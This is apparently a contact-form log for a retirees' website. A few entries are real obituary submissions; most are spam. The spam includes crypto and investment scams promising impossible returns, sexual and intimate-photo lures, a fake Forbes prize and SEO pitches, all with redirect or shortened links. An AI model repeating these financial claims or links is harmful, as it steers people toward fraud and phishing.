+++ 2021-12-04 02:16:08 PM -- Email from: TimothyItary, -- subject: Make Artificial Intelligence bring you more $ 7667 per day, -- email: cambrie.holguin@gmail.com, -- Message is: Fast income from one investment from $ 6656 in a day &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8ED7K&amp;sa=D&amp;93=75&amp;usg=AFQjCNEY3K5BsQ-mUq_FMcp6hGUAytb7Og &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-04 03:48:05 PM -- Email from: Agueda, -- subject: E-Systems/Raytheon Garland Retirees, -- email: barnhill.agueda@gmail.com, -- Message is: We always struggled to pack before a trip. What to bring, how many or how much of it, etc...
So we have created this Foldable Travel Bag. It's Just So Versatile!

. Easy to Fold and Unfold
. Large Storage Space
. Portable + Waterproof

60% OFF for the next 24 Hours ONLY + FREE Worldwide Shipping for a LIMITED time!

Buy now: https://ifashiononline.shop

Best Wishes,

Agueda
+++ 2021-12-04 07:09:08 PM -- Email from: Van Boyd, -- subject: Missing E-Teamer Obituary for Dr. Rodgers, -- email: vboyd777@aol.com, -- Message is: Dr. Rodgers was an E-Systems VP.  Here’s a link to his obituary so that it can be added to the list.

https://obits.dallasnews.com/us/obituaries/dallasmorningnews/name/phil-rogers-obituary?id=6951627
+++ 2021-12-04 07:22:09 PM -- Email from: Van Boyd, -- subject: Please Add Nicky Nimmo to obituary list, -- email: vboyd777@aol.com, -- Message is: Here’s a link to Nicky Nimmo’s obituary to be added to the list.

https://obits.dallasnews.com/us/obituaries/dallasmorningnews/name/nicky-nimmo-obituary?id=26023392
+++ 2021-12-05 12:31:46 PM -- Email from: Richard Andersen, -- subject: START TRADING  Online RIGHT NOW: With only 1 USD!, -- email: donotreply.betrave@gmail.com, -- Message is: Dear, 
Do you know that you could also achieve an additional profit of more than 10% in just a few days trading on stock markets worldwide with minimum risk? 
Would you like to start trading or investing in the stock market more easily and quickly, with more confidence, effectiveness &amp; efficiency? ONLINE? 
&gt; TRY IT RIGHT NOW FOR FREE 
You can start by opening a 100% free account, with a small amount like 1 USD for trial. To get started, please register here with our 100% accredited worldclass broker  CAPITAL, then we will guide you forward. 
Link for free registration RIGHT NOW: https://capital.com/?c=37799_3743058&amp;pid=cellxpert 
How to trade?: You just purchase an asset at a lower cost, then you resell it after a few moments (few hours or few days) at a higher cost; then you gain from the price increase. 
 
On behalf of BETRAVE Team Worldwide: For more infos please  contact us by email contact@betrave.org or whatsapp +237620171905 or visit: http://www.betrave.org/
+++ 2021-12-06 01:30:12 AM -- Email from: Marshall Siggers, -- subject: Instant Money, -- email: wasender99@gmail.com, -- Message is: Hey from the Marketing Guru.

Are you struggling to monetize your online business? 

We have a limited time offer from 20 offers from Affiliate Marketing to Dropshipping.

These are all training videos so you can stop wasting your time and money trying out different things.

We have limited stock available. Find it here: https://shoppy.gg/product/n1KUz6F
+++ 2021-12-06 03:28:51 AM -- Email from: $100B Bank, -- subject: Own a $100B Bank with a $250K Investment, -- email: noreplycbn88@bankbusiness.org, -- Message is: 
+++ 2021-12-06 04:25:22 PM -- Email from: Alonzo Lutes, -- subject: Get spendid X-Mas gifts your loved ones and friends, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for splendid X-mas gifts for your loved ones and friends? In that case,  DittART Designer Necklaces could be your right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com/4-all-models. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-12-06 08:37:35 PM -- Email from: TimothyItary, -- subject: Make Artificial Intelligence bring you more $ 6899 in a day, -- email: marceloavf3@hotmail.com, -- Message is: Passive income on the rise and fall of bitcoin more $ 5987 per day &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8ED7K&amp;sa=D&amp;78=20&amp;usg=AFQjCNEY3K5BsQ-mUq_FMcp6hGUAytb7Og &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-07 12:21:42 PM -- Email from: Ranker SEO, -- subject: Rank 1 on Google With Ranker SEO, -- email: billy.hartford@gmail.com, -- Message is: Hello, 

Greetings from Ranker SEO.

Are you looking for a genuine SEO service to rank your website top on Google? Are you cheated by fake SEO companies? 

You have found an affordable legitimate SEO agency to rank your website.

We have ranked 100s of websites such as blogs, shopify stores, ecommerce websites, adult websites, saas websites, etc. You can reach more customers by utilizing our backlinks.

For real proof, you can visit our website and check out. Contact us for more details.

Our Skype ID: support@ranker.one
Our Website: https://www.ranker.one

Thanks &amp; Regards
Ranker SEO
+++ 2021-12-08 07:27:39 AM -- Email from: Corine Nunez, -- subject: This HIDDEN SECRET Can Help You Get Buyers-DAILY-Guaranteed, -- email: dabron2000@gmail.com, -- Message is: Hello,

Are you always looking for EFFECTIVE ways to get MORE
customers, EVERY DAY, EVERY WEEK and EVERY MONTH?

If so, please give me just 5 minutes of your precious time...

I GUARANTEE to show you a HIDDEN SECRET...wonder-working
...and...PROVEN formula...that will allow you to...

EASILY get many buyers...SKYROCKET your sales...and let you
smile all the way to the bank.

What's more, because of this below-the-radar strategy...
many businesses, are already and have QUIETLY been using 
it to sell just about anything. For example...

Javier Rodriguez used this remarkable method, to rake in
$100,000 in 12 months, in his insurance business.

Brett Jones of NuVision Auto Glass, says he brought
in over half a million dollars, with this astounding tactic.

Vernon Taylor, a fitness trainer, saw his sales skyrocket
to over 50%, just by using this underground technique.

Cajuan Mayo, did an impressive $200,000 in his affiliate
marketing business, with this one-of-a-kind secret tool.

So, here's the deal. If you too, want to get hundreds and
even thousands of buyers...DAILY and MONTHLY...

And would like to have access to this jaw-dropping secret 
weapon...unlike anything, you've ever seen before...

Then just click on the link below, for the thrilling details.

https://t2m.io/7N2DPX3

I promise you; it'll be worth your time.

Thank you for your time.

Sincerely,
John Eyubeh

P.S. Plus, forgot to mention, if you also want to be on the 
first page of Google (which gets 97% of all visitors)...and get
NEW buyers EVERY DAY, EVERY WEEK, and EVERY MONTH...
Then you need to see this wonder-working HIDDEN SECRET
software, which will help you do that. So, if you too want to
joinn thousands of businesses acrosss the world, who already
and QUIETLY using this one-of-a-kind tool to make money
from Google buyers, then click on this link below, for more
details: https://t2m.io/oLyWMB1
+++ 2021-12-08 04:31:21 PM -- Email from: Williams Elledge, -- subject: Get spendid X-Mas gifts your loved ones and friends, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for splendid X-mas gifts for your loved ones and friends? In that case,  DittART Designer Necklaces could be your right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com/4-all-models. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-12-08 09:06:14 PM -- Email from: Mike Boolman, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Boolman
 
support@digital-x-press.com
+++ 2021-12-08 11:34:36 PM -- Email from: TimothyItary, -- subject: Anfangen zu verdienen Vor 173000 EUR pro Tag, -- email: sebastian.drechsel82@web.de, -- Message is: Schnelles Geld Vor 129000 EUR in der Woche &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; http://www.google.com/url?q=http%3A%2F%2Fgo.nihawiwa.com%2F0bnl&amp;sa=D&amp;15=53&amp;usg=AFQjCNEUPijOi1LFtA_rg0rU0qfVGTKd6A &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-09 03:55:18 PM -- Email from: Johan Fourie, -- subject: $175k/year on esyray.com, -- email: onlineb2bconsulting@gmail.com, -- Message is: We made $175,430.18 this year doing online sales from our website! You can do the same!

What we offer:
Instant Setup and consulting
The methods we used
3 Months of us helping you to get setup
Works in all countries.

Money back Guarantee. If you don't make back your $499 I will refund you.

https://shoppy.gg/product/dx1365S
+++ 2021-12-09 05:19:10 PM -- Email from: YOUR BANK, -- subject: Own Your $100B Bank with a $250K Investment, -- email: noreplycbn88@bankbusiness.org, -- Message is: 
+++ 2021-12-10 01:30:54 PM -- Email from: Boyd Borovansky, -- subject: 스포츠토토, -- email: do-not-reply@gmail.com, -- Message is: Check this video

Thank me later

https://www.youtube.com/watch?v=vAuZ2qt93ws
+++ 2021-12-10 09:29:47 PM -- Email from: Pasquale Hauser, -- subject: Bitcoin Billionare, -- email: pasquale.hauser45@gmail.com, -- Message is: Life is a blueprint of successful chances and opportunities.

Those who win grab these opportunities as they pass by..

https://bitcoinbillionare.me/
+++ 2021-12-10 10:45:23 PM -- Email from: Susan Johnson, -- subject: I have a quick question, -- email: livestaffinghub@gmail.com, -- Message is: Hello 
 
My main objective here, is to help you increase revenue for your business by providing Social Media Marketing for 1 WEEK FREE, then just $67 a month. 
 
To learn more: WATCH OUR VIDEO  https://bit.ly/lsh67offer 
 
Our specialist in Facebook, Instagram, LinkedIn and Twitter has a singular purpose and that is to drive more sales for your business, so that you will be our customer for life. 
 
This 1 WEEK FREE promotion is for this week only. So, if you want to get this deal before the deadline, click the link below. 
 
To learn more: WATCH OUR VIDEO https://bit.ly/lsh67offer 
 
Best, 
 
Susan Johnson
+++ 2021-12-11 04:37:51 PM -- Email from: YOUR BANK, -- subject: Own Your $100B Bank with a $250K Investment, -- email: noreplycbn88@bankbusiness.org, -- Message is: 
+++ 2021-12-12 12:29:22 AM -- Email from: Sophia Scott, -- subject: (2) Sophia sent you messages, -- email: blevins.deana@outlook.com, -- Message is: Sophia sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/SophiaScott/
+++ 2021-12-12 08:09:50 AM -- Email from: TimothyItary, -- subject: Passive income more $ 6579 per day, -- email: a.strehler@bluewin.ch, -- Message is: Income from one investment from $ 7796 in a day &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8Prmu&amp;sa=D&amp;43=46&amp;usg=AFQjCNH_EGwAiiB8MpWHxZlE1C27oj3Rvw &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-12 09:35:25 AM -- Email from: Genevieve, -- subject: E-Systems/Raytheon Garland Retirees, -- email: genevieve@bazilic.ru:443, -- Message is: 
+++ 2021-12-13 11:08:03 PM -- Email from: Kennith Dial, -- subject: Hire Live Chat Agents &amp; Virtual Assitants, -- email: virassist123@gmail.com, -- Message is: Hi there,

Turnkey Chat Software &amp; Trained Live Chat Agents 24/7 for Your Industry. Request a Demo! Boost Your Leads, Engage Your Prospects &amp; Take Your Customer Service to a New Level. Easy Setup. App for iOs &amp; Android. Click here: https://crotonz.com/livechat/

Affordable &amp; Professional Web Development - Wordpress/ Woocommerce/ Shopify and Custom Web development. Highly Experienced and Certified. Know More: https://crotonz.com/website-design-virtual-assistant.php

Kind Regards,
Sam Miller
info@crotonz.com
+++ 2021-12-13 11:16:45 PM -- Email from: Georgiana, -- subject: Best Offer for esyray.com, -- email: georgiana@marketrealtyfl.com, -- Message is: Christmas Best Gift! Free Shipping!  We offer 90% OFF for the OnTheGo Tote!

Click To See More Surprises: https://onthegotote.shop

The Best, 
Georgiana
+++ 2021-12-14 12:43:06 AM -- Email from: Amelia Webster, -- subject: Make $5000 before 2022, -- email: webster.amelia@gmail.com, -- Message is: Unlimited Email marketing for your business for $4.99

https://shoppy.gg/product/o9LF1iL
+++ 2021-12-14 09:17:38 AM -- Email from: TimothyItary, -- subject: A ready-made system for generating passive income more $ 9756 in a day, -- email: uphilipp@bluewin.ch, -- Message is: Make Artificial Intelligence bring you more $ 5699 in a day &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8Prmu&amp;sa=D&amp;43=77&amp;usg=AFQjCNH_EGwAiiB8MpWHxZlE1C27oj3Rvw &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-17 04:57:04 AM -- Email from: Patricia Froude, -- subject: Editorial Link Placement Request, -- email: patricia.froude@perfectdataentry.xyz, -- Message is: Dear Webmaster,

My name is Patricia Froude. I am senior link building acquisition strategist and SEO consultant.
 
While performing competition research for my client, I came across https://esyray.com/PreviousMeetings.html

One of my clients has a website in the similar niche. I was wondering if you could edit one of the relevant blog posts on your website and mention my client’s website on it. I will also provide you edits to make your editorial team’s job easier. 

We are willing to pay a small editorial fee to the quality site for your efforts.

Let me know your paypal email so that my writer can give you specific edits and we can start nurturing long term relationships for my other clients also.

Patricia.Froude
Senior Link Acquisition Strategist
SEO Consultant
+++ 2021-12-17 01:18:31 PM -- Email from: Mike Kennett, -- subject: DA60+ for esyray.com with -35%, -- email: no-replydrype@gmail.com, -- Message is: Greetings 
 
Do you want a quick boost in ranks and sales for your website? 
Having a high DA score, always helps 
 
Apply this -35% code ( MEGAPROMOTER ) while getting your esyray.com to have a DA above 60 points in Moz with us today and reap the benefits of such a great feat at an affordable rate. 
 
 
 
See our offers here: 
https://www.strictlydigital.net/product/moz-da50-seo-plan/ 
https://www.strictlydigital.net/product/moz-da60-seo-plan/ 
 
NEW: ahrefs DR70 is now possible: 
https://www.strictlydigital.net/product/ahrefs-seo-plan/ 
 
 
Thank you 
Mike Kennett
 
mike@strictlydigital.net
+++ 2021-12-19 08:40:16 PM -- Email from: Cleveland Schuster, -- subject: https://marketingguru.sell.app/product/unlimited-mail-servers, -- email: datasalestoday@protonmail.com, -- Message is: Mail servers for 2022.

Offer Expires 21 December 2021.

Valid to 20 People.

Send unlimited marketing / bulk emails for a year for a once off payment of $299.

Clean IP

Warm Up

Domain Included

Valid for 1 year

Sending speed: 10k/hour

https://marketingguru.sell.app/product/unlimited-mail-servers
+++ 2021-12-20 06:09:24 PM -- Email from: Alison Junker, -- subject: We can help you to find the very best mate, -- email: sales1@wexxastrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Are you looking for a new mate? Do you have several potential candidates for your new mate, but do you need to decide who will be the best of them? We can help you to make this vital decision. We will prepare a highly accurate and detailed Romantic Compatibility report for you and your potential mate(s), where you will get a lot of precise and highly detailed information about a possible relationship with your new mate. This analysis will help you to establish an excellent and a long-lasting relationship with your new partner. Please check more details at https://wexxastrologicalstudio.com. We will be pleased to hear from you. Have a great day. Best regards Craig WILSON, WEXX ASTROLOGICAL STUDIO, Denver, CO, sales@wexxastrologicalstudio.com, https://wexxastrologicalstudio.com
+++ 2021-12-21 07:33:19 PM -- Email from: Sophia Scott, -- subject: (2) Sophia sent you messages, -- email: steadman.laverne96@hotmail.com, -- Message is: Sophia sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/SophiaScott/
+++ 2021-12-22 09:01:56 AM -- Email from: TimothyItary, -- subject: Stabiles Einkommen von 16500 EUR in der Woche, -- email: s-keekekekeke@t-online.de, -- Message is: Stabiles Einkommen Vor 16800 EUR in der Woche &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc9jD1p&amp;sa=D&amp;23=13&amp;usg=AFQjCNE5-l7dYtpQNDLSz9x2TTehrGGJ2w &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-12-22 10:24:08 AM -- Email from: Mike Timmons, -- subject: Local SEO for more business, -- email: no-replydrype@gmail.com, -- Message is: Howdy 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Timmons
 
Speed SEO Digital Agency
+++ 2021-12-22 07:55:56 PM -- Email from: aspic, -- subject: I promised., -- email: q9q4vc9y@yahoo.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/y5mhgjrg
+++ 2021-12-23 05:33:40 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-12-25 06:46:09 PM -- Email from: IssacBak, -- subject: %#:- Quick earnings from $ 1500 per week )+*@, -- email: Jon.Methven@oldcoursehotel.co.uk, -- Message is: Hello. 
If you are interested in this type of earnings, then you should know that investments of $ 500 are needed here once *=&quot;% 
Further, you will receive from $ 1500 per week *^!- 
&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc9jD1p&amp;sa=D&amp;07=14&amp;usg=AFQjCNE5-l7dYtpQNDLSz9x2TTehrGGJ2w &lt;&lt;&lt;&lt;&lt; 
The essence of earning is to generate income from trading cryptocurrencies in an automatic mode, even if all markets collapse, you will be guaranteed to receive your money from $ 1500 per week. 
Manage to take your place in the sun and register :+(_ 
Limited offer %^)+ 
&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc9jD1p&amp;sa=D&amp;28=12&amp;usg=AFQjCNE5-l7dYtpQNDLSz9x2TTehrGGJ2w &lt;&lt;&lt;&lt;&lt;
+++ 2021-12-25 09:11:40 PM -- Email from: Larae, -- subject: E-Systems/Raytheon Garland Retirees, -- email: larae@esyray.com, -- Message is: New Multifunction Waterproof Backpack

The best ever SUPER Backpack: Drop-proof/Scratch-resistant/USB Charging/Large capacity storage

50% OFF for the next 24 Hours ONLY + FREE Worldwide Shipping for a LIMITED time

Buy now: https://thebackpack.sale

Kind Regards, 

Larae
+++ 2021-12-26 01:36:50 PM -- Email from: aspic, -- subject: I promised., -- email: 0t78lmi8@yahoo.com, -- Message is: Hi, this is Jeniffer. I am sending you my intimate photos as I promised. https://tinyurl.com/y42f9rv2
+++ 2021-12-27 03:56:11 AM -- Email from: WTE, -- subject: Make a 100-fold return on investment within 90 days, -- email: 100x@wtebank.com, -- Message is: {You can make a 100-fold return on investment within 90 days via the 100X investment bank platform at https://bit.ly/3m4uJOj . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3m4uJOj  now.
+++ 2021-12-28 09:41:44 PM -- Email from: 100X INVESTMENT BANK, -- subject: Make 100 times your money within 90 days, -- email: 100x@wtebank.com, -- Message is: {You can make 100 times your money within 90 days via the 100X investment bank platform at https://bit.ly/3z34tbn . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3z34tbn  now.
+++ 2021-12-28 09:41:49 PM -- Email from: 100X INVESTMENT BANK, -- subject: Make 100X return on investment within 90 days, -- email: 100x@wtebank.com, -- Message is: {You can make a 100X return on investment within 90 days via the 100X investment bank platform at https://bit.ly/3z34tbn . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3z34tbn  now.
+++ 2021-12-29 01:04:53 AM -- Email from: Kevin Johnson, -- subject: I have a quick question, -- email: tbformleads@gmail.com, -- Message is: Hello 
 
My main objective here, is to help increase revenue for you by producing an animated video that will generate leads and sales for your business 24/7, for just $97. 
 
But this offer is only good this week, so get your video before the deadline. 
 
Watch Our Video Now! https://bit.ly/Xpress97offer 
 
For less than you spend on coffee each month you get an American Owned Video company that can write your script, create your story board, lay-in a good soundtrack and produce an awesome video that brings home the bacon. 
 
Again, this $97 promotion is for this week only. Don’t miss out!!! 
 
I’m in, show me what you got. https://bit.ly/Xpress97offer 
 
Best, 
 
Kevin Johnson 
Business Development Manager
+++ 2021-12-29 11:04:39 PM -- Email from: Mike Molligan, -- subject: quality monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Hi there 
 
I have just took a look on your SEO for  esyray.com for its SEO Trend and saw that your website could use a push. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start improving your sales and leads with us, today! 
 
 
regards 
Mike Molligan
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-12-30 06:38:06 PM -- Email from: Shana Counts, -- subject: esyray.com shipping rates from China, -- email: pmtaking@163.com, -- Message is: Hi  esyray.com

We're Freight Forwarder/NVOCC Company located in Shenzhen,China. We cover EXW/FOB shipping from China  to USA,Canada,Europe,Oceania,Latin America,East Asia..

Our services:
- Ocean freight transport for FCL, LCL;
- Air freight Services,
- FBA Amazon Shipping,
- Warehouse consolidation, Customs Clearance &amp; Declaration
- Insurance, Cargo Inspection, Door to Door, etc.

The sea freight from China to the LA,USA  USD9500-10500/40HQ
The sea freight from China to Australia:USD5000-7000/40HQ
The sea freight from China to Europe:USD10500-12000/40HQ

World so please send me your requests and I will do my best and quote as much as I can. Just simply check any rates with us.

Thanks&amp;Best Regards,

Kroes     
pmtaking@163.com

-------------------------------------------
esyray.com
https://esyray.com
E-Systems/Raytheon Garland Retirees
+++ 2022-01-01 01:47:48 AM -- Email from: Forbes, -- subject: (1) Christmas Special Prizes for You, -- email: dalyell.polly@hotmail.com, -- Message is: Christmas special prizes from Forbes.

Hurry up

https://offers.forbes.blog/offers
+++ 2022-01-01 06:08:52 PM -- Email from: 100X INVESTMENT BANK, -- subject: Make 100 times your money within 90 days, -- email: 100x@wtebank.com, -- Message is: {You can make 100 times your money within 90 days via the 100X investment bank platform at https://bit.ly/3z34tbn . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3z34tbn  now.
+++ 2022-01-01 06:22:34 PM -- Email from: 100X INVESTMENT BANK, -- subject: The Best investment Opportunity for 2022, -- email: 100x@wtebank.com, -- Message is: {You can make a 100-fold return on investment within 90 days via the 100X investment bank platform at https://bit.ly/3z34tbn . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3z34tbn  now.
+++ 2022-01-03 01:30:51 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-03 06:23:31 AM -- Email from: 100X BANK, -- subject: Buy a $20B Bank With $10M Today, -- email: 100x@wtebank.com, -- Message is: You can buy a $20B bank with only $10M today. 100% of the work done is for you. Go to https://bit.ly/3eJYVsU to learn more. Richard Johnson
+++ 2022-01-03 06:23:31 AM -- Email from: 100X BANK, -- subject: Buy a $1B Bank With Only $500K, -- email: 100x@wtebank.com, -- Message is: You can buy a billion dollar bank with only $500K today. 100% of the work done is for you. Go to https://bit.ly/3eJYVsU to learn more. Richard Johnson
+++ 2022-01-03 07:07:06 AM -- Email from: Christian, -- subject: E-Systems/Raytheon Garland Retirees, -- email: saltau.christian71@yahoo.com, -- Message is: Hey 

Do you have time to brush your dog's teeth every day?

Let your dog clean his own teeth with our dog dental care brushing stick. Made of eco-friendly natural rubber, this toothbrush is sturdy. The soft design is safe for your dogs' gums and helps to clean their teeth and protect them from oral diseases and dental decay. 

Act Now And Receive A Special Discount!

Click here: https://dogcare.center

To your success, 
 
Christian
+++ 2022-01-03 12:14:34 PM -- Email from: 100X BANK, -- subject: Buy a $1B Bank With Only $500K, -- email: 100x@wtebank.com, -- Message is: You can buy a billion dollar bank with only $500K today. 100% of the work is done for you. Go to https://bit.ly/3eJYVsU to learn more. Richard Johnson
+++ 2022-01-03 03:59:20 PM -- Email from: 100X BANK, -- subject: Buy a $20B Bank With $10M Today, -- email: 100x@wtebank.com, -- Message is: You can buy a $20B bank with only $10M today. 100% of the work is done for you. Go to https://bit.ly/3eJYVsU to learn more. Richard Johnson
+++ 2022-01-03 03:59:20 PM -- Email from: 100X BANK, -- subject: Buy a $5B Bank With $2.5M Today, -- email: 100x@wtebank.com, -- Message is: You can buy a $5B bank with only $2.5M today. 100% of the work is done for you. Go to https://bit.ly/3eJYVsU to learn more. To your success, Jason Brian
+++ 2022-01-03 03:59:22 PM -- Email from: 100X BANK, -- subject: Buy a $100B Bank With $50M Today, -- email: 100x@wtebank.com, -- Message is: You can buy a $100B bank with only $50M today. 100% of the work is done for you. Go to https://bit.ly/3eJYVsU to learn more. To your success, Jason Brian
+++ 2022-01-05 01:20:51 AM -- Email from: Beatrice, -- subject: Concerning esyray.com, -- email: beatrice.stephenson@msn.com, -- Message is: Hi there 
 
CAREDOGBEST™ - Personalized Dog Harness. All sizes from XS to XXL.  Easy ON/OFF in just 2 seconds.  LIFETIME WARRANTY.

Click here: https://caredogbest.com
 
Best, 
 
Beatrice
E-Systems/Raytheon Garland Retirees
+++ 2022-01-05 09:42:27 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-05 09:31:11 PM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://bestvideo1.xyz/video1/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bestvideo1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-06 12:50:54 PM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

